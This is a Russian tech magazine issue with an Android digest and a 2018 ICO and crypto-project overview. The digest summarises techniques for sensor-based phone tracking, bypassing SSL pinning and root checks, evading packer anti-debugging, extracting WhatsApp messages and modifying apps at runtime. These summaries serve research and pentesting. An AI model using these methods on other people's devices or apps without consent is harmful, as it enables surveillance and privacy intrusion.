Сегодня в выпус ке: отслежива ние смартфона с вык лючен‐
ным GPS, взлом продвинутого упа ков щика Qihoo, восстанов‐
ление истории переписки и удаленных сообщений What‐
sApp, модификация приложений в рантайме. А так же: советы
по использованию шифрования в сво их приложениях, обзор
библиотеки Android KTX, спо собы распознавания отпе чат‐
ков, лица и голоса и, конечно же, подборка свежих биб‐
лиотек.


ИНСТРУМЕНТЫ

 • StaCoAn — инструмент для автоматизированного статического анализа
   приложений для Android; ищет захардкоженные API‐ключи, API‐эндпойнты,
   клю чи шифрования и ошибки;
 • Quiet — не новая, но весь ма интерес ная биб лиотека для передачи данных
   (протокол TCP) с помощью звука;
 • Electra — jailbreak для iOS 11.0–11.1.2;
 • LibScout — инструмент для поиска уязвимых версий библиотек в при ложе‐
   нии (может работать с обфусцированным кодом).


ПОЧИТАТЬ

Отсле живание смартфо на с вык лючен ным GPS
PinMe: Tracking a Smartphone User around the World — исследование, пос‐
вященное  отслеживанию  перемещений  смартфона  (и  его  владельца)
без использования GPS, геоло кации по базовым станциям и точкам дос тупа
Wi‐Fi. Вместо этого исследова тели из Института инже неров электротехники
и электроники исполь зовали акселерометр, гирос коп, барометр и компас,
которые позволили отследить маршрут перемещений с точностью GPS.
   Суть метода в следующем. На смартфон уста навливается приложение Pin‐
Me. В момент запуска оно получа ет информацию о последнем IP‐адресе
смартфона и таким образом определяет его приб лизительное местополо‐
жение. Затем начинается сбор информации с датчиков, который поз воляет
определить скорость движения, периодичность остановок и высоту над уров‐
нем моря. Эта информация используется для определения способа перед‐
вижения   (ходьба,   автомобиль,  общественный   транспорт,  самолет)
с помощью нейросети. Другая нейросеть исполь зуется для определе ния точ‐
ного местоположения по косвенным признакам, таким как высота, рас‐
писание рейсов и другие данные.
  Результат  оказался  весьма впечатляющим. Исследователям  удалось
добиться точности, сопоставимой с GPS. Однако есть и ограничения: PinMe
не будет работать в лесу и других мес тах, где нет дорог, он плохо работает
в плоской негористой мес тности с похожей тополо гией улиц (например, Ман‐
хэттен с его квадратными улицами). Также PinMe не сработает, если на смар‐
тфоне активирован Tor‐туннель (IP‐адрес отправной точки будет неправиль‐
ным).





  Черным отмечен маршрут, пос троенный с использованием GPS, жел тым
  и зеленым — при помощи PinMe


Пен тест для нович ков
A Virgil’s Guide to Pentest: Operation Android — основы пентеста для начина‐
ющих. Статья доволь но сумбурно написана, но из нее можно вынести многие
интересные вещи. Например:
 • два главных инструмента — jadx‐gui (декомпилятор) и apktool (позволяет
   разобрать APK и собрать его обратно);
 • самый простой способ обойти SSL pinning — Android‐SSL‐TrustKiller;
 • самый удобный инстру мент авто матичес кого поиска уязвимостей — Droz‐
   er;
 • значения ro.build.version.release, ro.product.model  и ro.
  product.brand в эмулято ре стоит изменить. Некоторые приложе ния
   используют их для иден тифика ции эмулируемой сре ды;
 • если в эмуляторе есть root‐дос туп и при ложение отказывается работать,
   просто пере именуй файлы /system/app/SuperUser.apk  (SuperSU.
  apk) и /system/bin/su .


Анализ приложе ния, защищенного упаковщиком Qihoo
Dissecting mobile native code packers. A case study — анализ приложения,
защищенного с помощью упа ковщика Qihoo. В статье приведено огромное
количество деталей, остановимся на некото рых из них.
 1. DEX‐файл приложения весит больше четырех мегабайт, однако при его
   анализе становится ясно, что там прос то нет столько кода: все, что он
   делает, — это переда ет управление нативной биб лиотеке. Так происходит
   потому, что большую часть файла занимает дописанный в его конец
  зашифрованный фрагмент.
 2. Загруженная натив ная биб лиотека выполняет несколько проверок на то,
   не работает ли она под отладчиком, а затем рас шифровывает и загружает
   в память вторую библиотеку. Кроме проверок на присутствие отладчи ка,
  библиотека  также использует дру гой метод защиты — виртуальную
   машину, которая исполняет байт‐код вместо нативного кода ARM.
 3. Вторая натив ная библиотека — это загрузчик DEX‐файлов. Он извлекает
   из конца оригинального DEX‐файла зашифрованный фрагмент, рас‐
  шифровывает его, подготавливает рантайм для исполнения, а затем
   передает ему управление.

Используемые техники защиты от дебаггинга:
 • чтение файла /proc/self/status и проверка, что значение TracerPid
   равно нулю;
 • чтение бинарного файла линкера  (/system/bin/linker) и проверка
   первого байта функции rtld_db_activity (если отладчик не подклю‐
   чен — эта функция будет пустой заг лушкой);
 • мониторинг файла /proc/PID/cmdline всех процессов (к которым есть
   доступ) в поисках определенных строк (android_server, gdb, gdbserver
   и других);
 • проверка файла /proc/net/tcp на содержание строки 00000000:
  23946 (это означает, что к устройству подключен IDA);
 • мониторинг файлов /proc/self/mem и /proc/self/pagemap, чтобы
   узнать, что никакое другое приложение не про чита ло их.


Восстановление исто рии переписки WhatsApp
WhatsApp Forensics: Decryption of Encrypted Databases and Extraction of Delet‐
ed Messages on Non‐Rooted Android Devices — простая, но в ряде моментов
интересная статья о том, как извлечь историю переписки WhatsApp из An‐
droid‐смартфона. Три основных метода:
 1. Сделать бэкап переписки с помощью самого WhatsApp. Бэкап будет
  зашифрован, и авторы не рассказывают, как извлечь ключ, зато обещают
   выпустить фирменную утилиту для автомати чес кого дампа бэкапа.
 2. Получить права root и ско пиро вать базу данных WhatsApp из приватного
   каталога (файл msgstore.db ). Она не зашифрована, поэтому ее легко
   просмотреть с помощью любого SQLite‐вьюера.
 3. Сделать бэкап средствами Android. Некото рые производители добавляют
   в свои смартфоны функцию бэкапа, и многие из них даже не заботятся
  о том, чтобы его зашифровать. На при мере смартфона компании Oppo
   авторы делают бэкап данных установленных при ложений, а затем без вся‐
   ких проблем извлекают из него данные WhatsApp (включая msgstore.db ).

В качестве бонуса авторы рас сказывают, как в ряде случаев можно восста‐
новить удаленные сооб щения. Дело в том, что перед записью сообщения
в базу данных WhatsApp сначала пишет его в кеш (файл msgstore.db‐wal),
а затем переносит в msgstore.db. При удалении сообщения оно будет уда‐
лено из основной базы, но иногда может остаться в кеше, откуда его легко
извлечь.





               Удаленное сооб щение, оставшееся в кеше


Ран тайм‑модификация приложе ний
Mobile Application Hacking Diary Ep.2 — статья с опи санием техник, изме‐
няющих поведение приложений Android и iOS, на при мере обхода проверок
наличия прав root на устройстве. Итак, три разные техники:
 1. Изменение кода. Декомпилиру ем приложение с помощью Bytecode Viewer
   (автор рекомен дует использовать именно его из‐за наличия сразу нес‐
   кольких движков деком пиляции в комплекте). Находим нужный участок
   кода, дизассемблируем приложение с помощью apktool, находим тот же
   участок кода и изменяем воз вращаемое им значение (например, true
   на false). Собираем обратно и уста навливаем.
 2. Изменение кода на лету с помощью отладчика. Рас паковываем приложе‐
   ние с помощью apktool, изменяем зна чение поля android:debuggable
   в AndroidManifest.xml на true, запаковываем обратно. Подключаемся к при‐
   ложению с помощью отладчика AndBug и выполняем трассировку в поис‐
   ках нужного нам метода. Затем подключаемся к приложению с помощью
    jdb, ставим брейк‐пой нт на нужный метод и изменяем воз вращаемое им
   значение.
 3. Автоматическое изменение кода на лету с помощью Frida. Инструмент Fri‐
   da позволяет выполнить трассировку и внедрить свой код в любое при‐
   ложение на смартфоне. В примере автор исполь зует скрипт для поиска
   нужного метода, а затем приводит пример скрипта, который находит этот
   метод и изменяет возвра щаемое им значение. Однако в большинс тве слу‐
   чаев тебе даже не придется самому писать скрипты. В репозитории Frida
   CodeShare можно найти множес тво уже готовых.


Кастомный Project Treble
Developer Brings Full Project Treble Compatibility to the Xiaomi Redmi Note 4 —
занятная статья о том, как разработчику с форумов XDA Developers удалось
портировать фреймворк Treble на Xiaomi Redmi Note 4.
  Напомню, что инициатива Treble предполага ет полностью реорганизовать
низкоуровневые компоненты Android, ответственные за поддержку железа.
Начиная с восьмой версии Android раз делен на две части, которые рас‐
полагаются в разных раз делах: vendor и system. Первый содержит исклю‐
чительно код, зависящий от железа: драйверы и компоненты HAL. Второй —
это сам Android. Между собой эти час ти связыва ются с помощью сообщений
и никогда не вызывают друг дру га напрямую.
  Идея здесь в том, что новые версии ОС, выпущенные после Android 8,
будут полностью совместимы с vendor‐компонентами от предыдущих версий,
таким образом сам процесс портирова ния прошивки существенно упростит‐
ся (на самом деле Google даже выпускает сборку Android под названием
Generic System Image, ее мож но про шить на любой смартфон с поддержкой
Treble, и она зарабо тает). Проб лема в том, что требование поддерживать Tre‐
ble распространяется только на смартфоны, изначально работающие на An‐
droid 8, и ее вряд ли получат устройства, выпущенные с Android 6 или 7 и лишь
затем обновленные до вось мой версии.
   Разработчик abhishek987 обошел эту проб лему. Он портировал компонен‐
ты Treble на Xiaomi Redmi Note 4, использовав раз дел cust, нужный MIUI
для хранения информации об устройстве, в качестве раздела vendor.





              Поддержка Treble на Xiaomi Redmi Note 4


РАЗРАБОТЧИКУ

Со веты по использованию шифрования
Basic Android Encryption Do’s and Don’ts — статья с набором быстрых советов
о том, что надо и что не надо делать при использовании шифрования в An‐
droid. Краткая выжимка:
  Не используй AES в режиме ECB. По умолчанию Android (и Java)
при шифровании по алгоритму AES применяет режим ECB. Проблема
режима ECB в том, что он может рас крыть подробности зашифрованной
информации. Вместо него следует использовать режимы CBC и GCM:


// Как надо делать
Cipher.getInstance("AES/GCM/NOPADDING");
// Как не надо делать
Cipher.getInstance("AES");


Всегда используй слу чайный IV:


// Как надо делать
SecureRandom secureRandom = new SecureRandom();
byte[] iv = new byte[IV_LENGTH];
secureRandom.nextBytes(iv);
myCipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(iv));
// Как не надо делать
myCipher.init(Cipher.ENCRYPT_MODE, key);
byte[] iv = myCipher.getIV();

Запол няй важ ные массивы нулями  после  использования. Ты
можешь забыть очистить мас сив, содержащий ключ, и взломщик восполь‐
зуется этим, чтобы извлечь ключ нап рямую из оперативной памяти:


byte[] decrypt(byte[] dataToDecrypt, byte[] secretKey) {
    // Расшифровываем данные
    ...
    // Очищаем ключ
    Arrays.fill(secretKey, (byte) 0);
    return decryptedData;
}


Распознавание пальцев, лица и голоса
How to secure your Android application? — статья с немного неумес тным наз‐
ванием о том, как использовать рас позна вание паль цев, лица и голоса в сво‐
их приложе ниях. Никаких откровений, все прос то:
 • Отпечатки пальцев. Вопреки расхожему мнению, приложение, зап‐
  рашивающее твой отпечаток пальца, на самом деле никогда его не уви дит
   и не сможет отправить на уда ленный сервер. Отпечатки пальцев (в виде
   математической модели) хра нятся в security‐сопроцессоре (TTE), получить
   доступ к которому может только ОС. Разработчику приложе ний остается
   только сделать запрос отпечатков и получить ответ (в кол бэке) о сов‐
   падении или несовпадении:


val fmanager = FingerprintManagerCompat.from(getApplicationContext())
fmanager.authenticate(cryptoObject, 0, cancellationSignal, authen
ticationCallback, null)

 • Распознавание лиц. Здесь у разработчика два пути: либо использовать
  библиотеку OpenCV, предназначенную для реалтайм‐рас познавания объ‐
   ектов на изображении (внимание: это не нейросеть), либо воспользовать‐
   ся услугами Microsoft и Google. Проб лема последне го варианта в том, что
   сервисы MS и Google платные и требуют пос тоянного подключения к сети.
 • Распознавание голоса. Три наблюдения: 1) Google Assistant умеет
   определять человека по голосу; 2) в ранних версиях Android 5.0 была фун‐
   кция Trusted Voice, которая поз воляла раз блокиро вать смартфон голосом;
   3) Google не предос тавляет  сторонним раз работчикам  никаких  API
   для распознавания голоса. Фактичес ки вариант только один: платные сер‐
   висы MS.


Изу чаем Android KTX
Exploring KTX for Android (перевод) — хорошее введение в библиотеку Android
KTX, которую 5 февраля анонсирова ла компания Google. Android KTX пред‐
ставляет собой набор функций и клас сов, способ ных существенно упростить
разработку для Android на Kotlin. Вот лишь некото рые (не буду скрывать,
наиболее сочные) примеры:


// Модификация настроек
sharedPreferences.edit {
    putBoolean(key, value)
}
// Работа с временем и датами
val day = DayOfWeek.FRIDAY.asInt()
val (seconds, nanoseconds) = Instant.now()
val (hour, minute, second, nanosecond) = LocalTime.now()
val (years, month, days) = Period.ofDays(2)
// Создание бандлов
val bundle = bundleOf("some_key" to 12, "another_key" to 15)
// Работа с AtomicFile
val fileBytes = atomicFile.readBytes()
val text = atomicFile.readText(charset = Charset.defaultCharset())
atomicFile.writeBytes(byteArrayOf())
atomicFile.writeText("some string", charset = Charset.defaultCharset
())
// SpannableString
val builder = SpannableStringBuilder(urlString)
    .bold { italic { underline { append("hi there") } } }
// Трансформация строки в URI
val uri = urlString.toUri()
// Работа с Drawable и Bitmap
val bitmap = drawable.toBitmap(width = someWidth, height = someHeight
, config = bitMapConfig)
val bitmap = someBitmap.scale(width, height, filter = true)
// Операции над объектом View
view.postDelayed(delayInMillis = 200) {
    // some action
}
view.postOnAnimationDelayed(delayInMillis = 200) {
    // some action
}
view.setPadding(16)
val bitmap = view.toBitmap(config = bitmapConfig)
// ViewGroup
viewGroup.forEach { doSomethingWithChild(it) }
val view = viewGroup[0]


Автоматизация получе ния скрин шотов
Automate your app screenshots — статья о том, как автоматизировать получе‐
ние «чистых» скриншотов для Google Play с помощью утилиты screengrab
и скрипта, который перево дит смартфон в деморежим, поз воляющий в том
числе настроить строку состояния. Сам скрипт можно скачать здесь, а вот
самая вкусная часть — включение/отклю чение деморежима:


function start_clean_status_bar {
    # Включаем деморежим
    adb shell settings put global sysui_demo_allowed 1
    # Показываем время 12:00
    adb shell am broadcast ‐a com.android.systemui.demo ‐e command
clock ‐e hhmm 1200
    # Показываем иконки мобильной и Wi‐Fi‐сетей без дополнительных
значков
    adb shell am broadcast ‐a com.android.systemui.demo ‐e command
network ‐e mobile show ‐e level 4 ‐e datatype false
    adb shell am broadcast ‐a com.android.systemui.demo ‐e command
network ‐e wifi show ‐e level 4 ‐e fully true
    # Скрываем все уведомления
    adb shell am broadcast ‐a com.android.systemui.demo ‐e command
notifications ‐e visible false
    # Показываем полный заряд батареи
    adb shell am broadcast ‐a com.android.systemui.demo ‐e command
battery ‐e plugged false ‐e level 100
}
function stop_clean_status_bar {
    adb shell am broadcast ‐a com.android.systemui.demo ‐e command
exit
}


Биб лиоте ки
 • backgroundable‐android — список механиз мов энергосбережения разных
  смартфонов и интенты, позволяющие открыть их настройки (чтобы поль‐
   зователь мог добавить приложение в список исклю чений);
 • kotlin‐android‐examples — мно жес тво различных примеров кода на Kotlin;
 • RichUtilsKt — набор утилит на все случаи жизни (диалоговые окна, работа
   с изображениями, файлами, буфером обмена и многое другое);
 • AwesomeBar — красивый анимированный ActionBar;
 • Fluid Slider — эффектный анимированный слайдер;
 • Sneaker — библиотека для показа сооб щений в верхней части экрана;
 • ColorPickerPreference — диалог выбора цвета;
 • Videoapparat — простая в использовании биб лиотека для работы с виде‐
   окамерой;
 • ScrollingPagerIndicator — индикатор горизонтальной прокрутки в виде
   точек;
 • Android‐Goldﬁnger — простая в исполь зовании биб лиотека для аутен‐
   тификации по отпечатку пальца;
 • KFormMaster — порт библиотеки для соз дания форм на Kotlin;
 • Prefekt — удобная в использовании биб лиотека для работы SharedPrefer‐
   ences из Kotlin;
 • Scripto — библиотека для обмена сооб щениями между Java и JavaScript,
   который исполняется внутри WebView;
 • Light — альтернативная реализация снекбара (snackbar) с возможностью
   кастомизации.
COVERSTORY


 АТЛАС
 МИРА КРИПТОВАЛЮТ


                 РАЗБИРАЕМСЯ С ICO
                 И ОРИЕНТИРУЕМСЯ
            В НОВЫХ КРИПТОПРОЕКТАХ





За пос ледний год от крип товалют ста ло
буквально некуда деваться: лихорадка май‐
нинга захватила умы, Bitcoin рос как на
дрожжах и был дважды форкнут, а новые
альткойны появ лялись чуть ли не каждый          Колин Фостер                                                                                             Поэт. Криптоэнтузиаст
день. Все это сопровождалось метаниями               https://foster.gacolin.patrick.
правительств, которые не зна ют, зап рещать            foster@gmail.com
или регулировать, и новостями о действиях
мошенников, которым уда валось уво дить
миллионы из‐под носа инвесто ров. Среди
всего этого безумия одна тенденция кажет‐
ся наиболее инте ресной — это Initial Coin
Oﬀering, или ICO.


ICOНОМИКА
Если ты смотрел «Вол ка с Уолл‐стрит», то помнишь, что в какой‐то момент,
чтобы срубить нормально баб ла, герою Ди Каприо и товарищам понадо‐
билось вывести ручную компанию на IPO. Суть вывода частной акци онерной
компании в публичное поле (то есть на биржу) — в привлечении средств.
После проведения IPO инвесто ры получают акции, становясь совладельцами
бизнеса, а компания увеличивает влияние на рынке и раз вивает инфраструк‐
туру. В криптовалютном мире место IPO занял ICO.
  Современные стартапы могут  сту чаться в двери венчурных фондов,
молиться на бизнес‐ангелов, собирать с миру по нитке на краудфандинге
или же махнуть на все это рукой и выпус тить свои токены. По сути, получается
краудфандинг на блокчейне.
  Организаторы пишут смарт‐контракт (например, на Solidity — языке кон‐
трактов Ethereum), в соответствии с которым инвесторы получают токены
в обмен на свои деньги. Цена токена при этом не зависит от блокчейна,
на котором он выпущен. В обозначенное время инвесторы смогут продать
токены на специальных бир жах, вернув свои вложения. Или даже многократно
приумножив.


             INFO

                     Сейчас  распространены  Ethereum‐токены  —
                        это  цифровые  средства,  которые  создаются
                       поверх блок чейна Ethereum. Они усиливают эко‐
                       систему  Ethereum,  повышая  спрос  на  ETH
                         («эфир») —  оригинальную  валюту  Ethereum,
                        которая необходима для работы смарт‐контрак‐
                           тов. Токен также можно создать поверх блокчей‐
                       нов BitShares, Bitcoin, Ripple, NEM и других.


Приобретя токены, вкладчики ждут «часа икс» — начала торгов их активов
на специальных биржах. Предположим, лис тинг на биржах проходит по рас‐
писанию, в проект продолжают верить и при поддержке биржевых спекулян‐
тов уже на старте торгов инвестор получает десятикратную прибыль. Тогда
перед ним будет стоять выбор: про дать токены или, напротив, оставить их
в портфеле. Ведь если стартап на блокчейне будет развиваться по своей
«дорожной карте», то дальше его токены будут торговаться только дороже.
   Увы,  так бывает не всегда. В нынеш нем виде ICO — это далеко
не футуристичная сказка о всеобщем богатс тве и счастье. Жесткий мир
победителей и проигравших в мире криптовалют все так же (а то и более)
жесток. Компания может исчезнуть сра зу пос ле ICO, подвергнуться хакерской
атаке (или постараться убедить в этом сообщес тво), проиграть другому стар‐
тапу с близкой идеей, внезапно закрыться под давлением мес тных властей
(или убедить в этом сооб щес тво), раз вивать ся очень медленно или не так,
как декларировалось в «белой бумаге»… Наконец, прос то не взлететь,
потому что «не смогла», как та лошадь из анекдота про скачки.
  Тем не менее, согласно журналу Forbes, в прошлом году в рамках ICO
было собрано более 2,3 миллиарда долларов. Пресей лы и краудсей лы про‐
ходят каждый день, и нередко миллионы «зеленых пре зидентов» вкладыва‐
ются в технологию, которую вообще мало кто понимает, особенно за пре‐
делами криптосообщества. Огромное количес тво скама, учас тие в ICO зна‐
менитостей вроде Пэрис Хилтон или недобитых боксеров и в целом постоян‐
ный  ажиотаж  вокруг  самой  темы  криптовалют  порождают  раз говоры
о «пирамидах», «мыльном пузыре» и конспи рологические теории.
  При этом большое чис ло недоб росовес тных игроков не должно вводить
тебя в заблуждение. В теории, ICO — замеча тельная технология, которая
отдает финансовые механизмы непос редс твенно в руки людям и позволяет
финансировать то, на что есть спрос, напрямую — без предварительного
благословения со стороны дядек в пиджаках с дипломами престижных вузов.
Совладельцем чего‐то нового и перспективного теперь может стать любой,
это ли не прекрасно?


Крат кий сло варь тер минов

 • Pre-ICO, пре сейл — предварительная про дажа токена для участников
   из «белого списка».
 • ICO (Initial Coin Offering), краудсейл, токен сейл — механизм прив‐
   лечения  средств, по  усло виям  которого будущий  токен продается
   за высоколиквидные криптовалю ты.
 • Фиат, фиатные деньги — все традиционные валюты.
 • То кен — внутренняя валюта компании, за которую в каждом конкретном
   случае инвестор может получить раз нообразные товары, услу ги, бонусы,
   права или привиле гии.
 • Форк — использование исходно го кода программного проекта для соз‐
   дания нового проекта на его базе.
 • Соф тфорк — изменение кода, которое не нарушает работу основного
   протокола.
 • Хардфорк — изменение исходно го кода, несопоставимое со старым
   протоколом и исполь зуемым ПО.
 • Баунти (bounty) — раз дача токенов за про веденную работу по прод‐
  вижению ICO  (перевод документов на  другие язы ки,  статьи, темы
   на форумах и прочее).
 • Эйрдроп (airdrop) — бесплатные раздачи новых токенов вследствие
   хардфорка проекта или условно‐бесплат ные («лайки» в соцсетях, вступ‐
   ление в телеграм‐группу и подобное).
 • «Белая бумага» (white paper) — главный документ о сути проекта ком‐
   пании и ее конечном про дукте.
 • «Дорож ная карта» (roadmap) — пос ледова тельный план раз вития ком‐
   пании.
 • dApps — децентрализованные приложения.
 • PoS (Proof of Stake) — доказательство доли владения. Для получения
   вознаграждения нужно иметь заданное количес тво монет на «депозите»
   и держать локальный кошелек открытым.
 • PoW (Proof of Work) — доказа тельство работы. Традиционный майнинг
   с получением вознаграж дения за выполнение вычислительной работы.
 • Смарт‑кон тракт  (smart  contract) —  алгоритм, пред назначенный
   для заключения и поддержания коммерчес ких контрактов в блокчей не.
 • MVP (minimum viable product) — минимально жизнеспособный про‐
   дукт,  обладающий  толь ко функциями, необ ходимыми  для проверки
   гипотезы, тестирования бизнес‐модели и получения обратной связи
   от потребителей.
 • Эскроу (escrow) — гаранты, обладающие доступом к собранным на ICO
   средствам.





                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
         АТЛАС МИРА
      КРИПТОВАЛЮТ
            РАЗБИРАЕМСЯ С ICO И ОРИЕНТИРУЕМСЯ
                      В НОВЫХ КРИПТОПРОЕКТАХ





ДЕСЯТКА СИЛЬНЫХ
Чтобы тебе было легче ориентироваться в мире криптовалют, мы собрали
несколько списков. Начнем с десят ки компаний, которые провели самые впе‐
чатляющие ICO и получили требуемые суммы. Не все из них уже успе ли озо‐
лотить инвесторов (и не факт, что озолотят), но они продолжают развиваться,
и знать о них стоит.
  Обрати внимание, что инвестиции в ICO пра вильно считать в биткойнах
или «эфире». Многие проекты показывают прибыль в долларах США (и
по крайней мере выходят в ноль), но часто это может только запутать из‐за
волатильности курсов. Биткойн — стандарт и драйвер раз вития криптоэко‐
номики. Прибыль от роста его курса час то быва ет выше, чем учас тие в опре‐
деленном ICO.
  В скобках приводим данные ICOStats.com. Это окупаемость инвестиций
в биткойнах с даты проведения ICO на 1 марта 2018 года. Порядок — про‐
извольный.

1. EOS (ROI +117% с 26.06.2017). Про ект компании Block One Дэна Лариме‐
ра и Брэнда Блумера. Представляет собой платформу для построения децен‐
трализованных приложений на блокчейне с упором на масштабирование.
Конкурент Ethereum. Продажа токенов стартовала 26 июня 2017 года, закон‐
чится ровно через год. За это время пройдет 350 периодов размещения.
В конце каждого пери ода общее количес тво монет EOS распределя ется
между инвесторами исхо дя из внесенной суммы ETH, поделенной на общий
взнос.





2. Status (SNT) (ROI +24% с 20.06.2017). Децентра лизованный мессенджер
и социальная сеть. Возможно, в будущем они будут конкурировать с TON Пав‐
ла Дурова. Разработчики называют свой проект «мобильной опе рационной
системой на Ethereum», к ней легко подключаются сторонние Ethereum‐при‐
ложения. Альфа‐версия уже дос тупна на iOS и для Android. В начале года Sta‐
tus инвестировал 5 миллионов долларов в мес сенджер Riot.im (децентра‐
лизованный мессенджер, который не требует при вязки к email или номеру
телефона). Во время кра удсейла 20–21 июня проект собрал 108 миллионов
долларов.





3. Bancor (BNT) (ROI –64% с 12.06.2017). Краудсейл Bancor стал вторым
после Filecoin по скорости: сумма в 150 миллионов дол ларов была собрана
в ETH за три часа в середине июня 2017 года. Пользователи Bancor могут
разрабатывать собственные токены стандарта ERC20 и обме ниваться ими
без комиссии. Своеоб разный индекс Доу Джонса на криптовалютном рынке.
Также здесь постоянно проходят кру тые баунти‐кампании. Однако проект
до сих пор не оправился от пос ледс твий негативных оценок в прессе и спра‐
ведливой критики известных блокчейн‐активистов. Кстати, размещения Ban‐
cor и Status были первыми, которые вызвали мас совый сбой в Ethereum: блок‐
чейн тогда не справился с обработкой всех транзакций в ETH, часть средств
вернулась к инвесторам.





4. Tezos (XTZ) — новый децентрализованный блокчейн, который обновля‐
ется без хардфорков. Создатели обещают, что он станет заменой Ethereum.
Tezos провел одну из самых успешных ICO‐кампаний прошлого года, однако
уже осенью из‐за конфликта раз работчиков с президентом своего же фонда
развития токен просел на 75%. По пос ледним новос тям, основате ли Tezos
(семейная пара Артур и Кэтлин Брайтман) готовы запустить сеть. Это стало
возможным после разборок в судах и основатель ной перетасовки кадров
в Tezos Foundation.





5. Filecoin (FIL) — про ект команды Protocol Labs, которая ставит глобаль‐
ные задачи улучшения и разработки интернет‐про токолов. Краудсейл Filecoin
проходил с перерывами с 10 августа до 7 сентября, причем 135 мил лионов
долларов стартап прив лек за первый час. 52 миллиона принесли в ходе pre‐
ICO инвесторы из списка AngelList. Стартап намерен создать аналог облачно‐
го хранения данных — децентрализованный сервис для хранения файлов,
основанный на блок чейне. Владельцы жес тких дис ков с помощью Filecoin
смогут зарабатывать, сдавая в аренду лишнее дис ковое пространство.





6. Ethereum (ETH) (ROI +17 464% с 22.07.2014). Думаю, что про «эфир»
Виталика Бутерина много рас ска зывать не надо. Его появление в 2014 году
принято считать одним из первых ICO: команда тогда продала 60 миллионов
единиц «эфира» на сумму 18 миллионов долларов. Платформа начала
работать в середине 2015 года. В июльском номере за 2016 год «Хакер» пос‐
вятил Ethereum обложку и целых пять ста тей, в том чис ле экскурс, интервью
с Бутериным, пример разработ ки смарт‐контракта и ис торию краха рас пре‐
деленной компании The DAO.





7. Brave (BAT) (ROI +136% с 31.05.2017). Кофа ундер Mozilla и создатель
языка Java Script Брендан Эйч за пустил браузер Brave еще в 2016 году (см.
наш обзор). Brave пред лага ет избавить интернет от надоедливой рекламы,
но при этом обойтись без блокировщиков типа AdBlock. Предполагается, что
пользователи сами будут решать, какие ресурсы вознаграждать по итогам
месяца. А создатели сайтов и популярные блогеры получили монетизацию
своих проектов без посредников в лице рекламных сетей. 31 мая 2017 года
команда разработчиков Brave провела самый быстрый краудсейл в истории.
За  полминуты  проекту  удалось  достигнуть  финансовой  цели  и  соб‐
рать 35 миллионов долларов. Всего 130 человек стали обладателями
токенов, что весьма не порадовало всех остальных, оставлявших заявки.





8. Storj (ROI +215% c 18.07.2014). Децентра лизо ванное зашифрованное фай‐
ловое хранилище с открытым исходным кодом. Конкурент Filecoin. Осенью
прошлого года был заключен партнерский договор с популярным FTP‐менед‐
жером  FileZilla. Во время проведения ICO раз работчикам удалось соб‐
рать 30 миллионов дол ларов за шесть дней. Три миллиона первоначально
инвестировали такие гиганты, как Google Ventures, Qualcomm Ventures и Tech‐
stars. Подробнее о Storj читай в статье «Доходный накопитель. Как сдать свой
диск в аренду и получать криптовалюту».





9. Aragon (ANT) (ROI –35% c 17.05.2017). Платформа для создания и пол‐
ного аудита децентрализованных орга низа ций. Любая компания, которая
не собирается держать «вторую бухгалтер скую книгу», может перенести
ведение всей документации в единую систему, где для хранения информации
используется блокчейн. 17 мая 2017 года всего за 15 минут со старта кра‐
удсейла проект соб рал 25 миллионов долларов в ETH.





10. IOTA (ROI +13 787% c 25.11.2015). Платежное средс тво для интернета
вещей. Работает не на блокчейне, а на собственной безблочной технологии
Tangle. На сегодня транзакции подтвержда ются медленно и система явля ется
фактически централизо ванной, зато нет комиссий и возможны микротран‐
закции. В далеком будущем участники смогут объединяться в кластеры и про‐
водить взаиморасчеты в офлайне. IOTA Foundation — офи циальный партнер
Microsoft. В сентябре IOTA была вынуждена объ явить об уязвимости своей
криптографической технологии. Брешь в системе была своевременно устра‐
нена, но уже в январе в результате сочетания фишинга и DDoS‐атаки
с кошельков пользователей пропали четыре миллиона долларов.





                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

         АТЛАС МИРА
      КРИПТОВАЛЮТ
            РАЗБИРАЕМСЯ С ICO И ОРИЕНТИРУЕМСЯ
                      В НОВЫХ КРИПТОПРОЕКТАХ





Дру гие перспек тивные про екты
 • Cardano (ANA) — смарт‐кон трактная платформа на язы ке программирова‐
   ния  Haskell c предусмотренным нормативным регулированием. Раз‐
   работал ее Чарльз Хос кинс, один из создателей Ethereum.
 • Einsteinium (EMC2) — криптовалюта, предназначенная для финансирова‐
   ния научных и технологических про ектов.
 • Emercoin (EMC) — распределенная система доверенной информации.
   Создана в 2013 году российской командой. Успешно раз вивается и растет
   в цене.
 • Verge (XVG) — криптовалюта с особым фокусом на анонимности. Исполь‐
   зует Tor и I2P. Транзакции проходят за пять секунд благодаря алгоритму
   «простой проверки платежей» (SVP).
 • Decred (DCR) — самофинансирующаяся криптовалюта, которой напрямую
   управляет сооб щество при помощи системы, интегрированной в блок‐
   чейн.
 • Komodo (KMD) — эко система на платформе SuperNET, состоящая на дан‐
   ный момент из atomic‐swap обменника, миксера‐анонимайзера, децен‐
   трализованных фиатных валют.
 • Steemit (STM) — «медиаблокчейн». Плат форма для монетизации автор‐
   ских текстов и фотог рафий непос редственно авторами и фотографами.


Китайский блок чейн
Власти Китая запрещают граж данам участвовать в ICO и периодичес ки кош‐
марят местные криптовалютные биржи. Прос лежива ется не то своеобразная
политика протекционизма, не то нежелание позволять китайским нуворишам
массово выводить день ги из страны. Так или иначе, на рынке появляется все
больше перспективных проектов с «азиатским акцентом».
 • QTUM (ROI +1009% c 12.03.2017). QTUM Blockchain Foundation зарегис‐
   трирован в Сингапуре в нояб ре 2016 года. Автор идеи Патрик Даи —
   выпускник института Драпера и китай ской Академии наук. В команде стар‐
   тапа целое созвездие опытных раз работчиков, известных по дру гим про‐
   ектам. Во время краудсейла были соб раны 5000 BTC в течение десяти
   минут, при этом собственные инвестиции учас тни ков проекта сос тавили
   более миллиона дол ларов. QTUM должен стать связующим звеном между
   блокчейном Bitcoin и Ethereum для предоставления мастер‐контрактов
   частным лицам и бизнесу.
 • Hshare (HSR). Цель Hshare — объединить блокчей ны ведущих криптовалют
   для эффективного взаимодействия. Пожалуй, это самое амбициозное
   объединение ради децентрализа ции. Пос мотри в честные глаза учас тни‐
   ков команды проекта на официальном сай те, у них может получиться.
   Главным партнером выс тупа ет Шанхайский университет. Продвижением
   проекта занимается Collin Star Capital — авс тра лийская компания, которая
   специализируется на блокчейне и управлении финансами. При успешной
   реализации проекта токены Hshare будут заменены на Hcash.
